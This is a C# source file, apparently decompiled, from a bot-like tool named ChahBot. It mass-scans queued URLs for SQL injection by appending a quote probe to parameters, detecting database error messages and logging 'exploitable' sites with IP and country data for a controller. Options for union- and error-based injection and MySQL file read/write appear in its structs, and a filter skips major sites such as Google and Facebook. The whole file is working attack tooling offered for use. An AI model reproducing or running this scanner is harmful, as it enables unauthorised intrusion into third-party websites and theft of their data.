using DataBase;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace ChahBot_1_0_Gacy.Controller
{
    class AnalyserUrls
    {
        private enum enInjectableType : byte
        {
            UnArchived,
            Archived
        }
        private enum CheckSearchType
        {
            Columns,
            Tables
        }
        private struct atAnalizer
        {
            public dynamic Order;
            public int TimeOut;
            public int Delay;
            public int Retry;
            public List<stAnalizerUrl> Urls;
            public bool StringColumn;
            public byte Threads;
            public int StartFrom;
            public int MaxUnion;
            public bool ServerInfo;
            public stCheckColumns CheckColumns;
            public bool IsReCheck;
            public bool IsRecheckOnlyColumns;
            public List<string> UnionStyle;
            public bool MySQLLoadFile;
            public bool MySQLWriteFile;
            public bool MagicQuotes;
            public enInjectableType Archive;
            public bool ErrorBasead;
            public bool UnionBasead;
            public bool UnionInteger;
            public bool UnionKeyword;
            public bool IntensiveCheck;
            public bool MySQLErrorUnion;
            public bool MSSQLErrorUnion;
            public bool AlexaRank;
        }
        private struct stAnalizerUrl
        {
            public string Url;

            public Types Method;
        }
        private struct stCheckColumns
        {
            public string Column1;

            public string Column2;

            public string Column3;

            public string Column4;

            public bool All1;

            public bool All2;

            public bool All3;

            public bool All4;

            public bool CurrentDB;

            public CheckSearchType SearchType;
        }
        private struct stScanner
        {
            public dynamic Order;
            public int TimeOut;
            public int Delay;
            public Hashtable Urls;
            public enHTTPMethod Method;
            public byte Threads;
            public bool TrashMsAccess;
            public bool TrashUnknown;
        }
        private class ThreadScanner
        {
            private int __ID;

            private DateTime __Started;

            [CompilerGenerated]
            private bool _TrashMsAccess;

            [CompilerGenerated]
            private bool _TrashUnknown;

            [CompilerGenerated]
            private Thread _Thread;

            [CompilerGenerated]
            private DateTime _Started;

            [CompilerGenerated]
            private object _Tag;

            [CompilerGenerated]
            private HTTP _HTTP;

            [CompilerGenerated]
            private string _OriginalUrl;

            [CompilerGenerated]
            private string _URL;

            [CompilerGenerated]
            private int _Delay;

            public bool TrashMsAccess
            {
                get
                {
                    return this._TrashMsAccess;
                }
                set
                {
                    this._TrashMsAccess = value;
                }
            }

            public bool TrashUnknown
            {
                get
                {
                    return this._TrashUnknown;
                }
                set
                {
                    this._TrashUnknown = value;
                }
            }

            public Thread Thread
            {
                get
                {
                    return this._Thread;
                }
                set
                {
                    this._Thread = value;
                }
            }

            public DateTime Started
            {
                get
                {
                    return this._Started;
                }
                set
                {
                    this._Started = value;
                }
            }

            public object Tag
            {
                get
                {
                    return this._Tag;
                }
                set
                {
                    this._Tag = RuntimeHelpers.GetObjectValue(value);
                }
            }

            public int ID
            {
                get
                {
                    return this.__ID;
                }
            }

            public HTTP HTTP
            {
                get
                {
                    return this._HTTP;
                }
                set
                {
                    this._HTTP = value;
                }
            }

            public string OriginalUrl
            {
                get
                {
                    return this._OriginalUrl;
                }
                set
                {
                    this._OriginalUrl = value;
                }
            }

            public string URL
            {
                get
                {
                    return this._URL;
                }
                set
                {
                    this._URL = value;
                }
            }

            public int Delay
            {
                get
                {
                    return this._Delay;
                }
                set
                {
                    this._Delay = value;
                }
            }

            public ThreadScanner(int id)
            {
                this.__ID = id;
                this.__Started = DateAndTime.Now;
            }
        }
        private struct stSearchSummary
        {
            public int Added;
            public int InExploitable;
            public int InInjectableDomain;
            public int InInTrash;
            public int NonInjectable;
            public int Unsupported;
            public int Found;

            public int Loaded()
            {
                return checked(this.Added + this.InExploitable + this.InInjectableDomain + this.InInTrash + this.NonInjectable + this.Unsupported);
            }
        }

        private StaticLocalInitFlag ExploiterCheckRequestDelay_LastTick_Init = new StaticLocalInitFlag();
	    private StaticLocalInitFlag ScannerExploitCheckDelay_LastTick_Init = new StaticLocalInitFlag();
	    private bool btnImportUrlTxt_Click_IsRunning;
	    private long ExploiterCheckRequestDelay_LastTick;
	    private long ScannerExploitCheckDelay_LastTick;
	    private Dictionary<string, List<string>> AnalizerCheckColumn_cDBS;
	    private StaticLocalInitFlag AnalizerCheckColumn_cDBS_Init;
	    private Dictionary<string, List<string>> AnalizerCheckTable_cDBS;
	    private StaticLocalInitFlag AnalizerCheckTable_cDBS_Init;

        private static bool __RunningWorker;
        private atAnalizer __Analizer;
        private stSearchSummary __SearchSummary;
        private ThreadPool __ThreadPoolScanner;
        private bool __IsMovingURLtoArchives;
        private bool __IsMovingURLtoExploitables;
        private Hashtable __EXPLOITABLES__;

        [AccessedThroughProperty("bckWorkerSQL")]
        private BackgroundWorker _bckWorkerSQL_;

        BackgroundWorker bckWorkerSQL;

        public AnalyserUrls()
        {
            __EXPLOITABLES__ = new Hashtable();
            bckWorkerSQL = new BackgroundWorker();
            bckWorkerSQL.DoWork += new DoWorkEventHandler(bckWorkerSQL_DoWork);
            bckWorkerSQL.ProgressChanged += new ProgressChangedEventHandler(bckWorkerSQL_ProgressChanged);
            bckWorkerSQL.RunWorkerCompleted += new RunWorkerCompletedEventHandler(bckWorkerSQL_RunWorkerCompleted);
            bckWorkerSQL.WorkerReportsProgress = true;
            bckWorkerSQL.WorkerSupportsCancellation = true;
        }

        public void StartWorker(dynamic order, int TimeOut, int numHttpDelay, int nbrThread, Hashtable urlQueue)
        {
           /* if (__RunningWorker)
            {
                return;
            }*/
            __Analizer.Order = order;
            Globals.UpDateStatus(__Analizer.Order, "Scanner URLS", "Scanner thread, loading please wait..");
            checked
            {
                if (urlQueue.Keys.Count == 0)
                {
                    global::Globals.UpDateStatus(__Analizer.Order, "Scanner URLS", "Exploiter thread, URL's queue is empty.");
                    Interaction.Beep();
                    return;
                }
                stScanner stScanner = default(stScanner);
                stScanner.Order = order;
                stScanner.TimeOut = Convert.ToInt32(TimeOut);
                stScanner.Delay = Convert.ToInt32(numHttpDelay);
                stScanner.Urls = urlQueue;
                stScanner.Method = enHTTPMethod.GET;
                stScanner.Threads = Convert.ToByte(nbrThread);
                stScanner.TrashMsAccess = true;
                stScanner.TrashUnknown = true;

                //commence
                this.bckWorkerSQL.RunWorkerAsync(stScanner);

                goto IL_FD3;
            }
            Interaction.Beep();
            return;
        IL_FD3:
            Console.WriteLine("Goto IL_FD3 Lauched");
        }

        [DebuggerStepThrough, CompilerGenerated]
        private void _Lambda__11(object a0)
        {
            ScannerExploit((ThreadScanner) a0);
        }

        private void bckWorkerSQL_DoWork(object sender, DoWorkEventArgs e)
        {
            int threads = 0;
            stScanner argument = (stScanner) e.Argument;
           /* try
            {*/
                __RunningWorker = true;
                if (argument.Urls.Count > argument.Threads)
                {
                    threads = argument.Threads;
                }
                else
                {
                    threads = argument.Urls.Count;
                }
                this.__ThreadPoolScanner = new ThreadPool(threads);
                using (HTTP http = new HTTP(argument.TimeOut, false))
                {
                    IDictionaryEnumerator enumerator = argument.Urls.GetEnumerator();
                    int num2 = 0;
                    while (enumerator.MoveNext())
                    {
                        DictionaryEntry current = (DictionaryEntry) enumerator.Current;
                        dynamic currData = current.Value;
                        string sUrlEntered = Conversions.ToString(currData["url"]);
                        if (this.bckWorkerSQL.CancellationPending || (this.__ThreadPoolScanner.Status == ThreadPool.ThreadStatus.Stopped))
                        {
                            return;
                        }
                        /*if (__Loading.Paused)
                        {
                            this.__ThreadPoolScanner.Paused = true;
                            while (__Loading.Paused)
                            {
                                Thread.Sleep(500);
                            }
                            this.__ThreadPoolScanner.Paused = false;
                        }*/
                        int percentProgress = (int) Math.Round(Math.Round((double) (((double) (100 * (num2 + 1))) / ((double) argument.Urls.Count))));
                        if (threads > 1)
                        {
                            Globals.UpDateStatus(__Analizer.Order, "Exploiter thread", "[" + Strings.FormatNumber(num2 + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) + "/" + Strings.FormatNumber(argument.Urls.Count, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) + "] Exploiter thread, exploitable detected: " + Conversions.ToString(this.__SearchSummary.Added));
                        }
                        else
                        {
                            Globals.UpDateStatus(__Analizer.Order, "Exploiter thread", "[" + Strings.FormatNumber(num2 + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) + "/" + Strings.FormatNumber(argument.Urls.Count, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) + "] Exploiter thread, exploitable detected: " + Conversions.ToString(this.__SearchSummary.Added) + ", exploiting: " + Globals.G_Utilities.GetDomain(sUrlEntered));
                        }
                        this.bckWorkerSQL.ReportProgress(percentProgress, "");
                    Label_024C:
                       /* try
                        {*/
                            Thread thread = new Thread(new ParameterizedThreadStart(_Lambda__11)) {
                                IsBackground = true,
                                Name = "Pos : " + num2.ToString()
                            };
                            ThreadScanner parameter = new ThreadScanner(num2) {
                                Thread = thread,
                                HTTP = http,
                                OriginalUrl = Conversions.ToString(currData["url"]),
                                URL = sUrlEntered,
                                TrashMsAccess = argument.TrashMsAccess,
                                TrashUnknown = argument.TrashUnknown,
                                Delay = argument.Delay
                            };
                            thread.Start(parameter);
                            this.__ThreadPoolScanner.Open(thread);

                            /* }
                             catch (Exception exception1)
                             {
                           // ProjectData.SetProjectError(exception1);
                            Thread.Sleep(0x3e8);
                            this.__ThreadPoolScanner.WaitForThreads();
                            ProjectData.ClearProjectError();
                            goto Label_024C;
                       // }*/
                            this.__ThreadPoolScanner.WaitForThreads();
                        num2++;
                        Thread.Sleep(200);
                        //Application.DoEvents();
                    }
                }
            /*}
           finally
           {*/
                this.__ThreadPoolScanner.AllJobsPushed();
                goto Label_045E;
            Label_036F:
                if (this.__ThreadPoolScanner.Finished)
                {
                    goto Label_0481;
                }
                if (threads == 1)
                {
                    //Dernier Thread restant Donc on envoie les resultats
                    Globals.GUI.sendExploitables(__Analizer.Order, __EXPLOITABLES__);
                    Globals.UpDateStatus(__Analizer.Order, "Exploiter thread", "[" + Conversions.ToString(argument.Urls.Count) + "/" + Conversions.ToString(argument.Urls.Count) + "] Exploiter thread, finishing thread..");
                }
                else
                {
                    Globals.GUI.sendExploitables(__Analizer.Order, __EXPLOITABLES__);
                    Globals.UpDateStatus(__Analizer.Order, "Exploiter thread", "[" + Conversions.ToString(argument.Urls.Count) + "/" + Conversions.ToString(argument.Urls.Count) + "] Exploiter thread, finishing thread(s) [" + Conversions.ToString(this.__ThreadPoolScanner.ThreadCount) + "]");
                }
                Thread.Sleep(200);
            Label_045E:
                this.bckWorkerSQL.ReportProgress(100, this.GetExploiterSummary());
                if (!this.bckWorkerSQL.CancellationPending)
                {
                    goto Label_036F;
                }
            Label_0481:;
           //}
        }
        private void bckWorkerSQL_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            int num2 = 0;
            bool Label_0062_go = false;
            Label_0062:
            try
            {
                bool flag = false;
                int num3 = 0;
            Label_0000:
                ProjectData.ClearProjectError();
                int num = 1;
            Label_0007:
                num3 = 2;
                //Globals.UpDateLoading(ref this.__Loading, e.ProgressPercentage, ref flag, "");
                Globals.GUI.setProgress(__Analizer.Order, e.ProgressPercentage);
            Label_0021:
                num3 = 3;
                if (!(flag | !Globals.NETWORK_AVAILABLE))
                {
                    goto Label_009F;
                }
            Label_002F:
                num3 = 4;
                this.bckWorkerSQL.CancelAsync();
                goto Label_009F;
            Label_003E:
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0000;

                    case 2:
                        goto Label_0007;

                    case 3:
                        goto Label_0021;

                    case 4:
                        goto Label_002F;

                    case 5:
                        goto Label_009F;

                    default:
                        goto Label_0094;
                }
                if (Label_0062_go)
                {
                    num2 = num3;
                    switch (num)
                    {
                        case 0:
                            goto Label_0094;

                        case 1:
                            goto Label_003E;
                    }
                }
            }
            catch (Exception exception1) //when (?)
            {
                ProjectData.SetProjectError(exception1);
                Label_0062_go = true;
                goto Label_0062;
            }
        Label_0094:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_009F:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
        }
        private void bckWorkerSQL_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            __RunningWorker = false;
            if (__EXPLOITABLES__.Values.Count > 0)
            {
                Globals.UpDateStatus(__Analizer.Order, "Scanner URLS", "Exploiter thread done, exploitable detected: " + Conversions.ToString(this.__SearchSummary.Added));
               // Globals.GUI.sendExploitables(__Analizer.Order, __EXPLOITABLES__);
            }
        }

        private void ScannerExploit(ThreadScanner o)
        {
            bool flag = false;
            try
            {
                Types types = new Types();
                List<string> list = Analizer.BuildTraject(o.URL, "'A=0", true);
                using (List<string>.Enumerator enumerator = list.GetEnumerator())
                {
                    while (enumerator.MoveNext())
                    {
                        int num = 0;
                        string current = enumerator.Current;
                        goto Label_004F;
                    Label_002A:
                        num++;
                        if (num > 5)
                        {
                            continue;
                        }
                        if (this.bckWorkerSQL.CancellationPending | !__RunningWorker)
                        {
                            return;
                        }
                    Label_004F:
                        this.ScannerExploitCheckDelay(o.Delay);
                        string sPostData = "";
                        string sErrDesc = "";
                        string str = o.HTTP.GetHTML(current, enHTTPMethod.GET, ref sPostData, null, null, false, ref sErrDesc, true);
                        if (string.IsNullOrEmpty(str))
                        {
                            goto Label_002A;
                        }
                        types = Utls.CheckSyntaxError(str);
                        switch (types)
                        {
                            case Types.None:
                                {
                                    continue;
                                }
                            case Types.Unknown:
                                goto Label_00E3;

                            case Types.MsAccess:
                                goto Label_00F3;
                        }
                        goto Label_00EF;
                    }
                    goto Label_0112;
                Label_00E3:
                    flag = !o.TrashUnknown;
                    goto Label_0112;
                Label_00EF:
                    flag = true;
                    goto Label_0112;
                Label_00F3:
                    flag = !o.TrashMsAccess;
                }
            Label_0112:
                if (flag)
                {
                    this.AddURL(o.OriginalUrl, new string[] { Utls.TypeToString(types) });
                    this.__SearchSummary.Found++;
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            finally
            {
                try
                {
                    Console.WriteLine("Thread Count =>" + __ThreadPoolScanner.ThreadCount);
                    this.__ThreadPoolScanner.Close(o.Thread);
                }
                catch (Exception exception2)
                {
                    ProjectData.SetProjectError(exception2);
                    ProjectData.ClearProjectError();
                }
                Application.DoEvents();
            }
        }
        private void AddURL(string sURL, params string[] sValues)
        {
            ProjectData.ClearProjectError();
            if (!__EXPLOITABLES__.ContainsKey(sURL))
            {
                this.__SearchSummary.InExploitable++;

                string sCountry = string.Empty;
                string sCountryCode = string.Empty;
                string sIP = string.Empty;

                CheckGeoIP(sURL, ref sIP, ref sCountry, ref sCountryCode);

                Dictionary<string, string> list = new Dictionary<string, string>();
                list.Add("url", sURL);
                list.Add("sqlType", sValues[sValues.Length - 1]);
                list.Add("ip", sIP);
                list.Add("country", sCountry);
                list.Add("countryCode", sCountryCode);

                __EXPLOITABLES__.Add(sURL, list);
                this.__SearchSummary.Added++;
            }
        }

        private void CheckGeoIP(string sURL, ref string sIP, ref string sCountry, ref string sCountryCode)
        {
            string domainCode;
            Utilities utilities = Globals.G_Utilities;
            lock (utilities)
            {
                sIP = Globals.G_Utilities.UrlToIP(sURL);
                domainCode = Globals.G_Utilities.GetDomainCode(sURL);
            }
            GeoIP oip = Globals.G_GEOIP;
            lock (oip)
            {
                if (Globals.G_GEOIP.CountryCodeExist(domainCode))
                {
                    sCountry = Globals.G_GEOIP.CountryNameByCode(domainCode);
                    sCountryCode = Globals.G_GEOIP.LookupCountryCode(sIP);
                }
                else
                {
                    sCountry = Globals.G_GEOIP.LookupCountry(sIP);
                    sCountryCode = Globals.G_GEOIP.LookupCountryCode(sIP);
                }
            }
        }

        private string GetExploiterSummary()
        {
            if ((this.__SearchSummary.InExploitable | this.__SearchSummary.NonInjectable | this.__SearchSummary.InInjectableDomain | this.__SearchSummary.InInTrash) != 0)
            {
                return string.Concat(new object[]
			{
				"URL's Found In(",
				RuntimeHelpers.GetObjectValue(Interaction.IIf(this.__SearchSummary.InExploitable != 0, " Exploitable:" + Strings.FormatNumber(this.__SearchSummary.InExploitable, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault), "")),
				RuntimeHelpers.GetObjectValue(Interaction.IIf(this.__SearchSummary.NonInjectable != 0, " Non-Injectable:" + Strings.FormatNumber(this.__SearchSummary.NonInjectable, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault), "")),
				RuntimeHelpers.GetObjectValue(Interaction.IIf(this.__SearchSummary.InInjectableDomain != 0, " Injectable Domain:" + Strings.FormatNumber(this.__SearchSummary.InInjectableDomain, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault), "")),
				RuntimeHelpers.GetObjectValue(Interaction.IIf(this.__SearchSummary.InInTrash != 0, " Trash:" + Strings.FormatNumber(this.__SearchSummary.InInTrash, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault), "")),
				RuntimeHelpers.GetObjectValue(Interaction.IIf(this.__IsMovingURLtoExploitables | this.__IsMovingURLtoArchives, ") Added: " + Strings.FormatNumber(this.__SearchSummary.Added, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault), ") Found:" + Strings.FormatNumber(this.__SearchSummary.Found, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault)))
			}).Replace("( ", "(");
            }
            return string.Concat(RuntimeHelpers.GetObjectValue(Interaction.IIf(this.__IsMovingURLtoExploitables | this.__IsMovingURLtoArchives, "Added: " + Strings.FormatNumber(this.__SearchSummary.Added, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault), "Found:" + Strings.FormatNumber(this.__SearchSummary.Found, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault))));
        }

        private void ScannerExploitCheckDelay(int iDelay)
        {
            if (iDelay != 0)
            {
                long num;
            Label_0075:
                num = (long) Math.Round((double) (((double) DateTime.UtcNow.Ticks) / 10000.0));
                if ((num - this.ScannerExploitCheckDelay_LastTick) > iDelay)
                {
                    this.ScannerExploitCheckDelay_LastTick = (long) Math.Round((double) (((double) DateTime.UtcNow.Ticks) / 10000.0));
                }
                else
                {
                    Application.DoEvents();
                    Thread.Sleep(100);
                    goto Label_0075;
                }
            }
        }

        #region Grosse Conditions
        internal bool UrlRight(string strURL)
        {
            bool flag = false;
            strURL = strURL.ToLower();
            bool flag2 = true;
            if (true == !strURL.StartsWith("http"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("../"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("///"))
            {
                return flag;
            }
            if (flag2 == (strURL.EndsWith(@"\") | strURL.EndsWith("/")))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("msnscache"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("assembla.com"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("altavista.com"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("aol.com"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("hotmail"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("live.com"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("pastebin.com"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("msn.com"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("/results.aspx"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("WindowsLiveTranslator"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("microsoft"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("google"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("terravista"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("facebook"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("yahoo"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("youtube"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("blogspot"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("sapo.pt"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("bing.com"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("urbandictionary.com"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("xmarks.com"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("yandex."))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("yandex."))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("ask."))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("wow.com"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("webcrawler."))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("mywebsearch."))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("infospace."))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("info.com"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("duckduckgo.com"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("blekko.com"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("contenko.com"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("dogpile.com"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("alhea.com"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("http://board."))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("https://board."))
            {
                return flag;
            }
            if (flag2 == strURL.Contains(";"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("["))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("]"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("\x00ab"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("\x00bb"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("\x00b4"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("`"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("^"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("~"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("$"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("@"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("€"))
            {
                return flag;
            }
            if (flag2 == strURL.Contains("|"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".dhtml"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".shtml"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".dhtm"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".html"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".htm"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".cgi"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".php"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".js"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".txt"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".doc"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".docx"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".pdf"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".xls"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".xml"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".ini"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".bin"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".jpg"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".jpeg"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".gif"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".png"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".mp2"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".mp3"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".mp4"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".mpg"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".mpeg"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".dvx"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".xvd"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".wmv"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".wma"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".wav"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".asp"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".mht"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".php"))
            {
                return flag;
            }
            if (flag2 == strURL.EndsWith(".aspx"))
            {
                return flag;
            }
            return (((((flag2 != strURL.EndsWith(".com")) && (flag2 != strURL.EndsWith(".flv"))) && ((flag2 != strURL.EndsWith(".us")) && (flag2 != strURL.EndsWith(".vu")))) && (((flag2 != strURL.EndsWith(".uk")) && (flag2 != strURL.EndsWith(".pt"))) && (((flag2 != strURL.EndsWith(".org")) && (flag2 != strURL.EndsWith(".net"))) && (flag2 != strURL.EndsWith("swf"))))) || flag);
        }
        #endregion
    }
}
